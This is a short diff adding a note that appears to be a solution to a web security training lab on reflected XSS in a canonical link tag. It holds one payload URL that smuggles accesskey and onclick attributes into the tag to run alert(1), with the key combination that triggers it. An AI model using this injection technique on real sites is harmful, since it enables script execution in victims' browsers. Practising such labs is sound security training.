@@ -1,0 +1,5 @@
+Reflected XSS in canonical link tag
+
+https://acee1f901efbff49814a691a0090005d.web-security-academy.net/?%27accesskey=%27x%27onclick=%27alert(1)
+
+Use ALT+SHIFT+X to trigger it
